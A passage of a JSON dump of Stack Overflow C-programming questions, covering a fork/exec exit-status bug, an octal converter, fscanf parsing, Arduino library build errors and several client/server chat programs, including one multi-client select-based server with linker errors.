!= 0)\n    {\n        neosmart::logger.Error(\"Failed to create pipe descriptor when trying to launch %s\", debug.c_str());\n        return EXIT_FAILURE;\n    }\n\n    pid_t pid = fork();\n\n    if (pid == 0)\n    {\n        close(pipefd[STDIN_FILENO]); //child isn't going to be reading\n        dup2(pipefd[STDOUT_FILENO], STDOUT_FILENO);\n        close(pipefd[STDOUT_FILENO]); //now that it's been dup2'd\n        dup2(pipefd[STDOUT_FILENO], STDERR_FILENO);\n\n        if (execvp(command.c_str(), &amp;argv[0]) != 0)\n        {\n            exit(EXIT_FAILURE);\n        }\n        return 0;\n    }\n    else if (pid &lt; 0)\n    {\n        neosmart::logger.Error(\"Failed to fork when trying to launch %s\", debug.c_str());\n        return EXIT_FAILURE;\n    }\n    else\n    {\n        close(pipefd[STDOUT_FILENO]);\n\n        int exitCode = 0;\n\n        if (wait)\n        {\n            waitpid(pid, &amp;exitCode, wait ? __WALL : (WNOHANG | WUNTRACED));\n\n            std::string result;\n            char buffer[128];\n            ssize_t bytesRead;\n            while ((bytesRead = read(pipefd[STDIN_FILENO], buffer, sizeof(buffer)-1)) != 0)\n            {\n                buffer[bytesRead] = '\\0';\n                result += buffer;\n            }\n\n            if (wait)\n            {\n                if ((WIFEXITED(exitCode)) == 0)\n                {\n                    neosmart::logger.Error(\"Failed to run command %s\", debug.c_str());\n                    neosmart::logger.Info(\"Output:\\n%s\", result.c_str());\n                }\n                else\n                {\n                    neosmart::logger.Debug(\"Output:\\n%s\", result.c_str());\n                    exitCode = WEXITSTATUS(exitCode);\n                    if (exitCode != 0)\n                    {\n                        neosmart::logger.Info(\"Return code %d\", (exitCode));\n                    }\n                }\n            }\n\n            if (output)\n            {\n                result.swap(*output);\n            }\n        }\n\n        close(pipefd[STDIN_FILENO]);\n\n        return exitCode;\n    }\n}\n</code></pre>\n\n<p>Note that the command is run OK with the correct parameters, the function proceeds without any problems, and <code>WIFEXITED</code> returns <code>TRUE</code>. However, <code>WEXITSTATUS</code> returns 0, when it should be returning something else.</p>\n"},{"tags":["c","decimal","octal"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":54,"score":5,"question_id":13189201,"title":"Decimal To Octal Converter, last digit issue","body":"<p>I tried making a C program to convert a user entered decimal number to octal. I wrote the C code with my own logic without any research of how other users try to do it. It works fine for the number <code>601</code> and some other numbers but for most numbers it returns the octal equivalent with the last digit being <code>1</code> less than it should be. For <code>75</code> it returns <code>112</code> instead of <code>113</code>. I realize using <code>printf</code> with <code>%o</code> gets the job done but it's kind of defeating the purpose of learning to program. Here's my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\n/* converting decimal to octal */\n\nint main() \n{\n    int n,x,y,p,s;\n    printf(\"Enter a decimal number \");\n    scanf(\"%d\",&amp;x);\n    s=0;p=0;\n\n    while (x!=0)\n    {\n         y=x%8;\n         s=s+y*pow(10,p);\n         x=(x-y)/8;\n         p=p+1;\n    }  \n\n  printf(\"the octal equivalent is: %d\\n\",s);\n  getch();\n  return 0;\n}\n</code></pre>\n"},{"tags":["c++","c","loops","inline-functions"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":94,"score":1,"question_id":13190326,"title":"Loops and inline functions","body":"<p>Why is it that a function with loops cannot be made inline?  Is it due to a performance issue or is there any other reason?</p>\n"},{"tags":["c","mp4"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13190005,"title":"Detect mp4 files","body":"<p>I have to design a module that detects <strong>mp4</strong> files. If will get any random file as input and it has to tell whether it is a mp4 file or not. Where can I find the specification of headers for the mp4 file? Tried googling but could not find anything except the signature. Any other tips regarding C programming for the module?</p>\n"},{"tags":["c++","c","bit-manipulation","embedded"],"answer_count":19,"favorite_count":251,"up_vote_count":333,"down_vote_count":2,"view_count":133636,"score":331,"question_id":47981,"title":"How do you set, clear and toggle a single bit in C?","body":"<p>How to set, clear and toggle a bit in C?</p>\n"},{"tags":["c","struct"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13190149,"title":"Can an 2D-array of struct type hold something like a NULL pointer?","body":"<p>I want to make an array of my struct type, but it is not defined in sequence, e.g, randomly I can do <code>array[3] = mystruct_t;</code> <code>array[5] = mystruct_t</code>(<code>3</code> and <code>5</code> is defined at run-time by user input). I had tried:</p>\n\n<p>it's the \"ideal\", but can't hold null-pointers:</p>\n\n<pre><code>static struct mystruct_t foo_inputs[SIZE];\n</code></pre>\n\n<p>So, I tried:</p>\n\n<pre><code>static struct mystruct_t *foo_inputs;\n</code></pre>\n\n<p>and then:</p>\n\n<pre><code>foo_inputs[x] = NULL;\n</code></pre>\n\n<p>But I get an warning:</p>\n\n<pre><code> error: incompatible types when assigning to type ‘struct mystruct_t’ from type ‘void *’\n</code></pre>\n\n<p>Ideas to implement it?</p>\n"},{"tags":["c","fscanf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13189592,"title":"Accepting Input with Ints and Strings with Spaces in C","body":"<p>I am trying to accept input from a file. This file is in the format of an integer, followed by a tab, followed by a string(which may or may not have spaces). </p>\n\n<p>for example:</p>\n\n<pre><code>1\\tls -l\n2\\tls\n</code></pre>\n\n<p>I tried using:</p>\n\n<pre><code>int   cmd_num;\nchar command[80];\n\nwhile (fscanf(ifp, \"%d\\t%s\", &amp;cmd_num, command) != EOF) {\n...\n}\n</code></pre>\n\n<p>However, this failed when it saw a space. Any help?</p>\n\n<p>Thanks</p>\n"},{"tags":["python","c","wxpython","pyqt"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":123,"score":2,"question_id":13173029,"title":"Can C programs have Python GUI?","body":"<p>I have an application written by my friend in <code>C</code> and having GUI made with <code>GTK</code> for linux system!! NOW I(we) want to change it's GUI in to python(<code>wxpython</code> or <code>PyQT</code>) is it possible? </p>\n\n<p>Sorry but i don't have python experience so don't know how to make Python communicate with C program.</p>\n\n<p>So,it it possible?? if yes can i have little bit guidance on it's how to..?</p>\n"},{"tags":["c","realloc"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":912,"score":2,"question_id":789413,"title":"resizing buffer using realloc","body":"<blockquote>\n  <p>If the area pointed to was moved, a\n  free(ptr) is done.</p>\n</blockquote>\n\n<p>Can you please explain the above line about <code>realloc()</code>?  This line is from a man page for calloc, malloc, realloc and free.</p>\n"},{"tags":["c","string"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13187254,"title":"Get int instead of pointer from strchr","body":"<p>How do I get the index of the first occurrence of a character in a string as an int and not a pointer to its location?</p>\n"},{"tags":["c","arduino","open"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13189965,"title":"Error installing Megaservo library on arduino","body":"<p>I am having problem installing the Megaservo library on arduino. I downloaded the megaservo library from arduino playground and then unzipped it in arduino/libraries\nThe MegaServo library is also seen in Sketch>Import Library.</p>\n\n<p>I have tried adding </p>\n\n<pre><code>#if defined(ARDUINO) &amp;&amp; ARDUINO &gt;= 100\n  #include \"Arduino.h\"\n#else\n  #include \"WProgram.h\"\n#endif\n</code></pre>\n\n<p>to my libraries <code>.cpp</code> file.\nStill I am having following errors.</p>\n\n<pre><code>C:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:71: error: 'servo_t' does not name a     \ntype\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:72: error: 'MAX_SERVOS' was not  \ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'void \nhandle_interrupts(servoTimer_t, volatile uint16_t*, volatile uint16_t*)':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:95: error: 'Channel' was not declared \nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:98: error: 'servos' was not declared \nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:102: error: 'Channel' was not \ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:104: error: 'servos' was not declared \nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:110: error: 'REFRESH_INTERVAL' was \nnot declared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'boolean \nisTimerActive(servoTimer_t)':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:176: error: 'servos' was not declared \nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:204: error: 'MegaServo' has not been\ndeclared\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:204: error: ISO C++ forbids \ndeclaration of 'MegaServo' with no type\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'int MegaServo()':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:206: error: 'MAX_SERVOS' was not \ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:207: error: invalid use of 'this' in \nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:208: error: 'servos' was not declared \nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:208: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:208: error: 'DEFAULT_PULSE_WIDTH' was\nnot declared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:211: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:211: error: 'INVALID_SERVO' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:214: error: 'MegaServo' is not a\nclass or namespace\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'uint8_t attach(int)':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:216: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:216: error: 'MIN_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:216: error: 'MAX_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:219: error: 'MegaServo' is not a\nclass or namespace\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'uint8_t attach(int,\nint, int)':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:221: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:221: error: 'MAX_SERVOS' was not \ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:223: error: 'servos' was not declared\nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:223: error: invalid use of 'this'\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:225: error: invalid use of 'this' in \nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:225: error: 'MIN_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:226: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:226: error: 'MAX_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:228: error: 'servoIndex' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:231: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:233: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:236: error: 'MegaServo' is not a\nclass or namespace\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'void detach()':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:238: error: 'servos' was not declared\nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:238: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:247: error: 'MegaServo' is not a \nclass or namespace\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'void write(int)':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:250: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:251: error: 'MAX_SERVOS' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:254: error: 'MIN_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:254: error: 'servos' was not declared\nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:254: error: 'MAX_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:256: error: 'MIN_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:256: error: 'servos' was not declared\nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:258: error: 'MAX_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:264: error: 'servos' was not declared\nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:269: error: 'MegaServo' is not a\nclass or namespace\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'void\nwriteMicroseconds(int)':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:271: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:274: error: 'MegaServo' is not a\nclass or namespace\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'int read()':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:276: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:276: error: 'MIN_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:276: error: 'servos' was not declared\nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:276: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:276: error: 'MAX_PULSE_WIDTH' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:276: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:279: error: 'MegaServo' is not a\nclass or namespace\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'int\nreadMicroseconds()':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:282: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:282: error: 'INVALID_SERVO' was not\ndeclared in this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:283: error: 'servos' was not declared\nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:283: error: invalid use of 'this' in\nnon-member function\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: At global scope:\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:290: error: 'MegaServo' is not a\nclass or namespace\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp: In function 'bool attached()':\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:292: error: 'servos' was not declared\nin this scope\nC:\\arduino-0023\\libraries\\MegaServo\\MegaServo.cpp:292: error: invalid use of 'this' in\nnon-    member function\n</code></pre>\n\n<p>I am working on arduino1.0. win7 system.</p>\n"},{"tags":["c","multithreading","homework","client-server"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":399,"score":4,"question_id":2888244,"title":"Need help with threads in a client/server","body":"<p>For college, I am developing a local relay chat. I have to program a chat server and client that will only work on sending messages on different terminal windows on the same computer with threads and fifos.</p>\n\n<p>The fifos part I am having no trouble, the threads part is the one that is giving me some headaches.</p>\n\n<p>The server has one thread for receiving commands from a fifo (used by all clients) and another thread for each client that is connected.</p>\n\n<p>For each client that is connected I need to know a certain information. Firstly, I was using global variables, which worked as longs as there was only one client connected, which is much of a chat, to chat alone. </p>\n\n<p>So, ideally I would have some data like:</p>\n\n<p>-nickname<br>\n-name<br>\n-email<br>\n-etc...  </p>\n\n<p>per client that is connected. However, I don't know how to do that.</p>\n\n<p>I could create a client_data[MAX_NUMBER_OF_THREADS] where client_data was a struct with everything I needed to have access to, but this would require to, in every communication between server and client to ask for the id of the client in the array client_data and that does not seem very pratical</p>\n\n<p>I could also instantiate a client_data immediately after creating the thread but it would only be available in that block, and that is not very pratical either.</p>\n\n<p>As you can see I am in need of a little guidance here. Any comment, piece of code or link to any relevant information is greatly appreciated.</p>\n\n<p>Thanks.</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":512,"score":0,"question_id":4358383,"title":"C scanf with spaces problem","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1247989/how-do-you-allow-spaces-to-be-entered-using-scanf\">How do you allow spaces to be entered using scanf?</a>  </p>\n</blockquote>\n\n\n\n<p>printf(\"please key in book title\\n\"); \n    scanf(\"%s\",bookname);</p>\n\n<p>i inside the data like this :-\nC Programming</p>\n\n<p>but why output the data like this :-\nC</p>\n\n<p>lose the Programming (strings) ?</p>\n\n<p>why</p>\n\n<p>thanks.</p>\n"},{"tags":["c","multithreading","chat"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":387,"score":3,"question_id":8194853,"title":"chat server-client in C. using threads or processes?","body":"<p>First of all the environment I m working on is Windows 7 and Visual Studio 2010.</p>\n\n<p>I already wrote a server that uses select method to retrieves data from more than one client.</p>\n\n<p>Also I wrote and the client that connected to the server above, by running ( <code>client.exe localhost 4444 Peter</code>). \"Peter\" is the username that this user wants to use. </p>\n\n<p>Now lets say we have 2 users connected on the server. Each of them has the ability to run the command <code>/help</code>. This returns some other commands that user can use. One command of these is <code>/listusr</code> that returns the all the users on the server. </p>\n\n<p>One other command is the <code>/talk2</code> and here is where my problem-question begins. I want to let user choose to which of the other users want to talk. E.g if you want to talk to Peter you give <code>/talk2 Peter</code>.</p>\n\n<p>My question is how I'm gonna start something like this. How the server will send the message from me to the Peter (I have to add here that when a new user connected server saves his username and his socket number in a struct) ? </p>\n\n<p>I need to create new threads for each conversation  or new processes ? Can someone give me some hint or advice to continue my project ? I'm little confused on how to manage at this point .</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c","homework","ipc","chat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":836,"score":0,"question_id":1551304,"title":"Local Chat server in C using IPC","body":"<p>Hi Guys I need to write a chat server in C. It only needs to use IPC.</p>\n\n<p>Could you help me on how to proceed on this. A skeleton code will help me a lot.</p>\n"},{"tags":["c","client-server","chat"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2951,"score":1,"question_id":1587881,"title":"Multi client chat server in C - Execution Problem","body":"<p>I am implementing a Multi client chat server, and i am getting the following error. Only hint i get from the error description is that it is a linker error. Can anyone help me resolving this.</p>\n\n<pre><code>viper[1052]% gcc -Wall -o server server.c\nserver.c: In function âMainServerLoopâ:\nserver.c:45: warning: pointer targets in passing argument 3 of âacceptâ differ in signedness\n/tmp/ccQIY5wn.o: In function `MainServerLoop':\nserver.c:(.text+0x6c): undefined reference to `ListCreate'\nserver.c:(.text+0xb3): undefined reference to `ListCreate'\nserver.c:(.text+0xcc): undefined reference to `ListAddInt'\nserver.c:(.text+0x25b): undefined reference to `ListAddString'\nserver.c:(.text+0x27d): undefined reference to `ListAddInt'\nserver.c:(.text+0x4bf): undefined reference to `ListDeleteInt'\nserver.c:(.text+0x4cc): undefined reference to `ListDeleteString'\nserver.c:(.text+0x6d0): undefined reference to `ListDestroy'\nserver.c:(.text+0x6d9): undefined reference to `ListDestroy'\ncollect2: ld returned 1 exit status\n\n\n/*List.h */\n#ifndef __RUL_LIST_H__\n#define __RUL_LIST_H__\n\n#define MAX_STRING_LEN 21\n\ntypedef struct TAG_LIST_ITEM {\n union {\n  char strval[MAX_STRING_LEN];\n  int  intval;\n } values;\n struct TAG_LIST_ITEM *next;\n} ListItem;\n\ntypedef struct TAG_LIST {\n ListItem *first;\n ListItem *last;\n unsigned int count;\n} List;\n\nList *ListCreate();\nvoid ListDestroy(List **list);\n\nvoid ListAddString(List *, const char *item);\nvoid ListDeleteString(List *, const char *item);\n\nvoid ListAddInt(List *, int item);\nvoid ListDeleteInt(List *, int item);\n\n#endif\n/* List.h */\n\n/*Server.c*/\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/time.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;arpa/inet.h&gt; \n#include &lt;errno.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include \"list.h\"\n\nconst int SERVER_PORT   = 13000;\nconst int BUFFER_SIZE  = 256;\nconst int MAX_BUFFER_NUM = 100;\n\nconst int MAX_CLIENT_ID_LEN = MAX_STRING_LEN - 1;\n\nvoid MainServerLoop(int);\nvoid HandleClient(int connfd);\nint  Max(List *list);\n\nvoid MainServerLoop(int sockfd)\n{\n char clientID[MAX_CLIENT_ID_LEN + 1];\n List *listClientID = ListCreate();\n\n int connfd, i;\n struct sockaddr_in cliAddr;\n int lenAddr = sizeof(cliAddr);\n\n fd_set readfds;\n FD_ZERO(&amp;readfds);\n List *listSock = ListCreate();\n ListAddInt(listSock, sockfd);\n FD_SET(sockfd, &amp;readfds);\n\n char readbuf[BUFFER_SIZE];\n char writebuf[MAX_BUFFER_NUM][BUFFER_SIZE];\n int numWriteBuf = 0;\n\n while (select(Max(listSock) + 1, &amp;readfds, NULL, NULL, NULL) &gt;= 0)\n {\n  if (FD_ISSET(sockfd, &amp;readfds))  // listening socket\n  {\n   connfd = accept(sockfd, (struct sockaddr *)&amp;cliAddr, &amp;lenAddr);\n   if (connfd &lt; 0)\n   {\n    printf(\"error while calling accept()\\n\");\n    exit(1);\n   }\n\n   int len = read(connfd, clientID, MAX_CLIENT_ID_LEN);\n   if (len &gt; 0)\n   {\n    if (clientID[len] != '\\0')\n    {\n     clientID[len] = '\\0';\n    }\n\n    ListAddString(listClientID, clientID);\n    printf(\"user %s logged in\\n\", clientID);\n    ListAddInt(listSock, connfd);\n    printf(\"Number of user : %d\\n\", listClientID-&gt;count);\n    printf(\"Number of sock desc : %d\\n\" , listSock-&gt;count);\n\n    if (numWriteBuf &lt; MAX_BUFFER_NUM)\n    {\n     sprintf(writebuf[numWriteBuf++], \"User %s logged in\\n\", clientID);\n    }\n   }\n   else\n   {\n    close(connfd);\n   }\n  }\n\n  ListItem *sockItem = listSock-&gt;first;\n  if (sockItem) sockItem = sockItem-&gt;next; // bypass listening socket\n  ListItem *clientIDItem = listClientID-&gt;first;\n  while (sockItem != 0 &amp;&amp; clientIDItem != 0)\n  {\n   if (FD_ISSET(sockItem-&gt;values.intval, &amp;readfds)) // connected socket\n   {\n    int len = read(sockItem-&gt;values.intval, readbuf, BUFFER_SIZE - 1);\n    if (len &gt; 0)\n    {\n     if (numWriteBuf &lt; MAX_BUFFER_NUM)\n     {\n      readbuf[len] = '\\0';\n      strcpy(writebuf[numWriteBuf], clientIDItem-&gt;values.strval);\n      strncat(writebuf[numWriteBuf], \": \", 2);\n      strncat(writebuf[numWriteBuf], readbuf, len);\n      ++numWriteBuf;\n     }\n    }\n    else if (len == 0)\n    {\n     ListItem *nextSock = sockItem-&gt;next;\n     ListItem *nextClient = clientIDItem-&gt;next;\n\n     FD_CLR(sockItem-&gt;values.intval, &amp;readfds);\n     close(sockItem-&gt;values.intval);\n     printf(\"user %s logged off\\n\", clientIDItem-&gt;values.strval);\n     ListDeleteInt(listSock, sockItem-&gt;values.intval);\n     ListDeleteString(listClientID, clientIDItem-&gt;values.strval);\n     printf(\"Number of user : %d\\n\", listClientID-&gt;count);\n     printf(\"Number of sock desc : %d\\n\" , listSock-&gt;count);\n\n     if (numWriteBuf &lt; MAX_BUFFER_NUM)\n     {\n      sprintf(writebuf[numWriteBuf++], \n       \"User %s logged off\\n\", clientIDItem-&gt;values.strval);\n     }\n\n     sockItem = nextSock;\n     clientIDItem = nextClient;\n     continue;\n    }\n   }\n\n   sockItem = sockItem-&gt;next;\n   clientIDItem = clientIDItem-&gt;next;\n  }\n\n  for (i = 0; i &lt; numWriteBuf; ++i)\n  {\n   sockItem = listSock-&gt;first;\n   if (sockItem) sockItem = sockItem-&gt;next; // bypass listening socket\n   while (sockItem != 0)\n   {\n    write(sockItem-&gt;values.intval, writebuf[i], strlen(writebuf[i]) + 1);\n    sockItem = sockItem-&gt;next;\n   }\n  }\n  numWriteBuf = 0;\n\n  sockItem = listSock-&gt;first;\n  while (sockItem != 0)\n  {\n   FD_SET(sockItem-&gt;values.intval, &amp;readfds);\n   sockItem = sockItem-&gt;next;\n  } \n }\n\n printf(\"server error %d, exit !\\n\",errno);\n ListDestroy(&amp;listSock);\n ListDestroy(&amp;listClientID);\n}\n\nint Max(List *listInt)\n{\n if (listInt-&gt;first == 0) return 0;\n\n ListItem *curItem = listInt-&gt;first;\n int max = curItem-&gt;values.intval;\n curItem = curItem-&gt;next;\n\n while (curItem != 0)\n {\n  if (curItem-&gt;values.intval &gt; max) \n  {\n   max = curItem-&gt;values.intval;\n  }\n  curItem = curItem-&gt;next;\n }\n\n return max;\n}\n\n\nint main()\n{\n int sockfd = socket(AF_INET, SOCK_STREAM, 0);\n if (sockfd &lt; 0)\n {\n  printf(\"socket() function failed\\n\");\n  exit(1);\n }\n\n struct sockaddr_in addr;\n addr.sin_family = AF_INET;\n addr.sin_addr.s_addr = htonl(INADDR_ANY);\n addr.sin_port = htons(SERVER_PORT);\n\n if (bind(sockfd, (struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0)\n {\n  printf(\"bind() function failed\\n\");\n  exit(1);\n }\n\n if (listen(sockfd, SOMAXCONN) &lt; 0)\n {\n  printf(\"listen() function failed\\n\");\n  exit(1);\n }\n\n printf(\"server started, listening at port %d\\n\", SERVER_PORT);\n\n MainServerLoop(sockfd);\n\n return 0;\n}\n/* Server.c*/\n</code></pre>\n"},{"tags":["c","pointers","data-structures","error-handling","typedef"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13189175,"title":"Incompatible Types With User Created Structures","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8755637/assignment-from-incompatible-pointer-type-warning\">“Assignment from incompatible pointer type” warning</a>  </p>\n</blockquote>\n\n\n\n<p>I have two structures, one which builds off the other. My hope is to use them together to create an adjacency list for a directed weighted graph.</p>\n\n<p>Here are my structures:</p>\n\n<pre><code>typedef struct{\n        int v;\n        int edgeWeight;\n        struct adjEdge * next;\n}adjEdge;\n\ntypedef struct{\n        int v;\n        int weight;\n        struct  adjEdge *adj;\n}vertex;\n</code></pre>\n\n<p>So basically the vertex adj will be null unless there is a connection to another vertex, which is the adjEdge structures function. </p>\n\n<p>My issue is that when I assign a adjEdge to the vertex structure I am getting an error:</p>\n\n<pre><code>bfs.c:75: warning: assignment from incompatible pointer type \n</code></pre>\n\n<p>Here is part of the code. Look to it to see where the errors are actually being thrown</p>\n\n<pre><code>while((fscanf(fp, \"%d %d %d\", &amp;u, &amp;v, &amp;w)) != EOF)\n{\n    vertexArray[u-1].v = u;\n\n\n    adjEdge * newEdge;\n    newEdge-&gt;v = v;\n    newEdge-&gt;edgeWeight = w;\n    newEdge-&gt;next = NULL;\n\n    if(vertexArray[u-1].adj = NULL)\n    {\n        vertexArray[u-1].adj = newEdge; //error\n    }\n    else\n    {\n        adjEdge * traverse = vertexArray[u-1].adj; //error\n        while(traverse-&gt;next != NULL)\n        {\n            traverse = traverse-&gt;next; //error\n        }\n        traverse-&gt;next = newEdge;  //error\n    }\n}\n</code></pre>\n\n<p>I thought once declared in my structures I could utilize assignments like 